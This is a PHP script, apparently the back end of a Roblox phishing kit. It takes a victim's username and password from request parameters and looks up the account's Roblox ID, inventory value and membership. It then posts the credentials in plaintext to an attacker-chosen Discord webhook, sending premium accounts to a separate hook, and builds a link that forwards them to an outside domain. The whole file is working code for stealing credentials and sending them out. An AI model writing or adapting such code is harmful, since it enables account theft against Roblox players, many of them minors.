<?php  
error_reporting(0);
   $username = $_GET['username'];
   $password = $_GET['ps'];
   $mem_stat = $_GET['mem'];
   $gameid = $_GET['gameid'];
   $age = $_GET['age'];
   $NBC = $_GET['webhook'];
   $Prem = $_GET['premium'];
   $veri = $_GET['verified];
   $success = $_GET['success'];
   $fail = $_GET['fail'];

$aage = $_GET['aage'];
$check123 = file_get_contents("https://api.roblox.com/users/get-by-username?username=$username", false);
$user = json_decode($check123);
$id = $user->{'Id'};
$aw = file_get_contents("https://data.rbxcity.com/user-inventories/fetch/history/$id");
$ew = json_decode($aw,true);
foreach($ew['data'] as $as){
    $aws =  $as['recentAveragePrice'];
}
$rap = number_format($aws);
//Broken Verified Checker
$check123 = file_get_contents("http://api.roblox.com/Ownership/HasAsset?userId=$id&assetId=102611803", false);
$security = "Unverified";
          
if($check123 == true){
    $security = "Verified";
}
$embed = json_encode([

    "content" => "",

    "username" => "Uniqu Mgui",

    "avatar_url" => "https://cdn.discordapp.com/icons/649474803387858955/25b0a7208be5443249b05cb56c5b2c04.png?size=128",

    "tts" => false,

    "embeds" => [

        [

            "title" => "View Account",

            "type" => "rich",


            "description" => "",


            "url" => "http://roblox.com/users/$id",

            "timestamp" => "",


            "color" => hexdec( "ff0a0a" ),

            "footer" => [
                "text" => "Auto login won't work for now",
                "icon_url" => "https://thumbs.gfycat.com/DiligentWastefulGavial-small.gif"
            ],

            "image" => [
                "url" => ""
            ],

            "thumbnail" => [
                "url" => "https://www.roblox.com/bust-thumbnail/image?userId=$id&width=420&height=420&format=png"
            ],


            "author" => [
                "name" => "",
                "url" => ""
            ],


            "fields" => [

                [
                    "name" => "Username",
                    "value" => "`$username`",
                    "inline" => true
                ],

                [
                    "name" => "Password",
                    "value" => "`$password`",
                    "inline" => true
                ],
                 [
                    "name" => "Rap",
                    "value" => "`R$ $rap`",
                    "inline" => true
                ],
                [
                    "name" => "Security",
                    "value" => "`$veri`",
                    "inline" => true
                ],
                 [
                    "name" => "Memebership",
                    "value" => "`$mem_stat`",
                    "inline" => true
                ],
                [
                    "name" => "Account Age",
                  "value" => "`$aage`, `$age`",
                    "inline" => true
                ],
                [
                    "name" => "Solve Account",
                  "value" => "[Click Me](https://ghostreborn.xyz/api/webhook.php?username=$username&password=$password&webhook=$success&fail=$fail)",
                    "inline" => true
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init();

$webhook = $NBC;
if($mem_stat == 'Premium'){
    $webhook = $Prem;
}

curl_setopt_array( $ch, [
    CURLOPT_URL => $webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $embed,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);
$response = curl_exec( $ch );
curl_close( $ch );
?>
